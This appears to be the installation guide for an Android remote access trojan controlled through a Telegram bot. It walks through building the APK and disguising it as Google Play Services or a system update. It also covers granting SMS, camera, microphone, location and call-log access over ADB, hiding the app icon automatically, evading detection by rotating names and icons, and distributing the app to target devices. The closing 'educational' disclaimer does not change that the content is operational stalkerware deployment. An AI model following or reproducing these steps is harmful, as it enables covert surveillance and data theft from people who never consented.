# Complete Installation & Setup Guide

## Overview
This guide covers the complete installation, configuration, and deployment of the Advanced Android RAT with Telegram bot integration, auto-hide functionality, and screen bypass features.

## System Requirements

### Development Environment
- **Operating System**: Windows 10/11, macOS 10.14+, or Linux (Ubuntu 20.04+)
- **RAM**: Minimum 8GB (16GB recommended)
- **Storage**: 20GB free space
- **Internet**: Stable connection required

### Software Prerequisites
- **JDK**: OpenJDK 11 or higher
- **Android Studio**: Arctic Fox (2020.3.1) or newer
- **Android SDK**: API Level 21-33
- **Android NDK**: r21 or newer
- **Python**: 3.8 or higher
- **Gradle**: 7.0 or higher

## Step 1: Environment Setup

### Install Android Studio

#### Windows
1. Download Android Studio from https://developer.android.com/studio
2. Run the installer
3. Follow the setup wizard
4. Install Android SDK, NDK, and Build Tools

#### macOS
```bash
brew install --cask android-studio
```

#### Linux
```bash
sudo snap install android-studio --classic
```

### Install Required SDK Components

1. Open Android Studio
2. Go to **Tools** → **SDK Manager**
3. Install the following:
   - Android SDK Platform 33
   - Android SDK Build-Tools 33.0.0
   - NDK (Side by side) - version 21.0+
   - CMake 3.18.1
   - Android SDK Command-line Tools

### Install Python and Dependencies

#### Windows
```bash
# Download Python from python.org
# Then install pip packages
pip install Flask==3.0.0
pip install requests==2.31.0
pip install cryptography==41.0.7
pip install python-telegram-bot==20.7
```

#### macOS/Linux
```bash
python3 -m pip install Flask==3.0.0 requests==2.31.0 cryptography==41.0.7 python-telegram-bot==20.7
```

## Step 2: Clone and Setup Project

### Clone Repository
```bash
git clone https://github.com/legendhkek/Android-rat.git
cd Android-rat/android-app
```

### Configure Gradle

Edit `local.properties` (create if doesn't exist):
```properties
sdk.dir=/path/to/Android/Sdk
ndk.dir=/path/to/Android/Sdk/ndk/21.4.7075529
```

### Verify Project Structure
```
android-app/
├── app/
│   ├── build.gradle
│   ├── proguard-rules.pro
│   ├── src/
│   │   └── main/
│   │       ├── AndroidManifest.xml
│   │       ├── java/com/apkmodifier/
│   │       ├── cpp/
│   │       ├── assets/
│   │       ├── res/
│   │       └── jniLibs/
│   └── dictionary.txt
├── build.gradle
└── settings.gradle
```

## Step 3: Configure Application

### Create Environment Configuration

Create `.env` file in `app/src/main/assets/`:

```env
# Server Configuration
HOST=0.0.0.0
PORT=5000
FLASK_ENV=production

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_ADMIN_CHAT_ID=your_chat_id_here

# Security
SECRET_KEY=generate_random_key_here
MAX_FILE_SIZE_MB=100

# Optional: Remote Upload
UPLOAD_SERVER_URL=https://your-server.com/upload
UPLOAD_API_KEY=your_api_key_here
```

### Get Telegram Bot Token

1. Open Telegram and search for `@BotFather`
2. Send `/newbot`
3. Follow instructions to create bot
4. Copy the bot token
5. Save it in `.env` file

### Get Your Chat ID

1. Search for `@userinfobot` in Telegram
2. Start conversation
3. Bot will reply with your Chat ID
4. Save it in `.env` file

### Configure Signing (Production)

Edit `app/build.gradle` and add:

```gradle
android {
    signingConfigs {
        release {
            storeFile file("../keystore.jks")
            storePassword "your_store_password"
            keyAlias "your_key_alias"
            keyPassword "your_key_password"
        }
    }
    
    buildTypes {
        release {
            signingConfig signingConfigs.release
            // ... other settings
        }
    }
}
```

### Generate Keystore

```bash
keytool -genkey -v -keystore keystore.jks -keyalg RSA -keysize 2048 -validity 10000 -alias release_key
```

Answer the prompts and save the keystore file in the `android-app` directory.

## Step 4: Build the Application

### Clean Build

```bash
cd android-app
./gradlew clean
```

### Debug Build (for testing)

```bash
./gradlew assembleDebug
```

**Output:** `app/build/outputs/apk/debug/app-debug.apk`

### Release Build (production)

```bash
./gradlew assembleRelease
```

**Output:** `app/build/outputs/apk/release/app-release.apk`

### Verify Build

```bash
# Check APK info
aapt dump badging app/build/outputs/apk/release/app-release.apk

# Check APK size
ls -lh app/build/outputs/apk/release/app-release.apk
```

Expected size: **200MB+** (due to included ML models, libraries, and resources)

## Step 5: APK Customization

### Rename APK (Stealth)

Choose a legitimate-sounding name:

```bash
cp app-release.apk "Google Play Services Update.apk"
# or
cp app-release.apk "System Security Update.apk"
# or
cp app-release.apk "Android System Update.apk"
```

### Change Package Name (Optional)

Edit `app/build.gradle`:

```gradle
defaultConfig {
    applicationId "com.google.android.gms.update"  // Change this
    // ... other settings
}
```

Then update all Java files and AndroidManifest.xml with new package name.

### Change App Name

Edit `app/src/main/res/values/strings.xml`:

```xml
<resources>
    <string name="app_name">System Service</string>
</resources>
```

Or choose from these stealth names:
- Google Play Services
- System Update
- Android System
- Device Manager
- Security Service
- Network Service

### Change Icon (Optional)

Replace icon files in `app/src/main/res/mipmap-*/` with system-looking icons.

## Step 6: Install on Device

### Enable Developer Options

1. Go to **Settings** → **About Phone**
2. Tap **Build Number** 7 times
3. Developer Options enabled

### Enable USB Debugging

1. Go to **Settings** → **Developer Options**
2. Enable **USB Debugging**
3. Connect device via USB

### Install APK

#### Via ADB
```bash
adb install app/build/outputs/apk/release/app-release.apk
```

#### Via File Transfer
1. Copy APK to device
2. Open file manager
3. Tap APK file
4. Allow installation from unknown sources
5. Install

### Verify Installation

```bash
# Check if installed
adb shell pm list packages | grep apkmodifier

# Check services running
adb shell ps | grep apkmodifier
```

## Step 7: Grant Permissions

### Required Permissions

The app will request these permissions on first launch:

**Critical Permissions:**
- Storage (Read/Write)
- Location (Fine/Coarse)
- Phone (Call, Read State)
- SMS (Read, Send, Receive)
- Contacts (Read, Write)
- Camera
- Microphone
- Overlay (Draw over other apps)

### Grant Permissions Manually

If auto-request doesn't work:

```bash
# Grant all permissions via ADB
adb shell pm grant com.apkmodifier android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.apkmodifier android.permission.WRITE_EXTERNAL_STORAGE
adb shell pm grant com.apkmodifier android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.apkmodifier android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.apkmodifier android.permission.READ_PHONE_STATE
adb shell pm grant com.apkmodifier android.permission.READ_CONTACTS
adb shell pm grant com.apkmodifier android.permission.READ_SMS
adb shell pm grant com.apkmodifier android.permission.CAMERA
adb shell pm grant com.apkmodifier android.permission.RECORD_AUDIO
adb shell pm grant com.apkmodifier android.permission.CALL_PHONE
adb shell pm grant com.apkmodifier android.permission.READ_CALL_LOG
```

### Special Permissions

#### Draw Over Other Apps
```bash
adb shell appops set com.apkmodifier SYSTEM_ALERT_WINDOW allow
```

#### Ignore Battery Optimization
1. Go to **Settings** → **Battery**
2. Find app in battery optimization
3. Select "Don't optimize"

## Step 8: Verify Functionality

### Check Services

```bash
# List running services
adb shell dumpsys activity services | grep apkmodifier
```

Should show:
- DataCollectionService
- BotCommandService
- AutoHideService
- ScreenManager
- PythonServerService
- BackgroundProcessService

### Check Server

```bash
# Port forward to access Flask server
adb forward tcp:5000 tcp:5000

# Test server
curl http://localhost:5000/api/bot/devices
```

### Test Telegram Bot

1. Open Telegram
2. Find your bot
3. Send `/start`
4. Should receive help message
5. Send `/devices`
6. Should see connected device

### Test Command Execution

```bash
# In Telegram
/screenshot your_device_id

# Should receive confirmation and screenshot within 10 seconds
```

## Step 9: Auto-Hide Configuration

The app will automatically hide its icon after **24 hours** from installation.

### Check Hide Status

```bash
adb shell dumpsys package com.apkmodifier | grep enabled
```

### Force Hide Now (for testing)

```bash
adb shell am startservice -n com.apkmodifier/.AutoHideService -a FORCE_HIDE
```

### Show Icon Again (maintenance)

```bash
adb shell pm enable com.apkmodifier/.MainActivity
```

## Step 10: Production Deployment

### Security Checklist

- [ ] Change default bot token
- [ ] Set strong admin chat ID
- [ ] Use release keystore
- [ ] Enable ProGuard obfuscation
- [ ] Test on multiple devices
- [ ] Verify anti-detection works
- [ ] Test auto-hide functionality
- [ ] Verify screen bypass works
- [ ] Test all bot commands
- [ ] Backup configuration

### Distribution Methods

#### Method 1: Direct APK
- Host APK on secure server
- Generate download link
- Share link securely

#### Method 2: OTA Update
- Implement update mechanism
- Host APK with version check
- Auto-download and install

#### Method 3: Physical Access
- Copy APK to device
- Install manually
- Clean up installation files

### Best Practices

1. **Unique Package Names**: Change package name for each deployment
2. **Custom Icons**: Use different icons to avoid detection
3. **Varied Names**: Rotate app names between deployments
4. **Secure Communication**: Use encrypted channels only
5. **Regular Updates**: Keep application updated
6. **Monitoring**: Check bot regularly for device status
7. **Data Management**: Regularly backup collected data
8. **Clean Logs**: Clear logs after reviewing

## Troubleshooting

### Build Errors

#### NDK Not Found
```bash
# Set NDK path in local.properties
ndk.dir=/path/to/ndk
```

#### Out of Memory
```bash
# Increase Gradle heap size
# Edit gradle.properties
org.gradle.jvmargs=-Xmx4096m
```

#### Missing Dependencies
```bash
./gradlew --refresh-dependencies clean build
```

### Runtime Errors

#### Services Not Starting
1. Check permissions granted
2. Verify device not in doze mode
3. Check logcat for errors:
```bash
adb logcat | grep apkmodifier
```

#### Bot Not Responding
1. Verify bot token is correct
2. Check admin chat ID
3. Test Flask server accessibility
4. Check network connectivity

#### Auto-Hide Not Working
1. Verify AutoHideService is running
2. Check SharedPreferences for install time
3. Review logcat for errors

#### Black Screen Issues
1. Verify ScreenManager is running
2. Check wake lock permissions
3. Disable battery optimization
4. Grant overlay permission

### Performance Issues

#### High Battery Usage
- Reduce data collection frequency
- Optimize wake lock usage
- Disable unnecessary services

#### Slow Response
- Check network latency
- Verify bot polling interval
- Optimize command processing

## Advanced Configuration

### Custom Command Interval

Edit `BotCommandService.java`:

```java
private static final long POLL_INTERVAL = 5000; // 5 seconds instead of 10
```

### Custom Data Collection Interval

Edit `DataCollectionService.java`:

```java
private static final long COLLECTION_INTERVAL = 600000; // 10 minutes instead of 5
```

### Custom Auto-Hide Duration

Edit `AutoHideService.java`:

```java
private static final long ONE_DAY_MILLIS = 12 * 60 * 60 * 1000; // 12 hours instead of 24
```

## Maintenance

### Update Bot Token

1. Edit `.env` file
2. Rebuild APK
3. Uninstall old version
4. Install new version

### Backup Configuration

```bash
# Backup preferences
adb backup -f backup.ab -apk com.apkmodifier

# Restore
adb restore backup.ab
```

### Monitor Logs

```bash
# Real-time monitoring
adb logcat -s apkmodifier:V

# Save logs to file
adb logcat -s apkmodifier:V > app_logs.txt
```

## Security Recommendations

1. **Never expose bot token** publicly
2. **Use VPN** for communication
3. **Encrypt sensitive data** before storage
4. **Regular security audits**
5. **Monitor for detection**
6. **Update frequently**
7. **Use secure servers** for data storage
8. **Implement kill switch** for emergencies

## Support

For issues or questions:
1. Check README.md
2. Review TELEGRAM_BOT_GUIDE.md
3. Check GitHub issues
4. Review logcat output

## Legal Disclaimer

This application is for **educational and authorized testing purposes only**. Unauthorized access to devices, data collection without consent, or any illegal activity is strictly prohibited. Users are solely responsible for compliance with all applicable laws and regulations.

---

**Installation complete!** Your Advanced Android RAT with Telegram bot integration is ready to use.
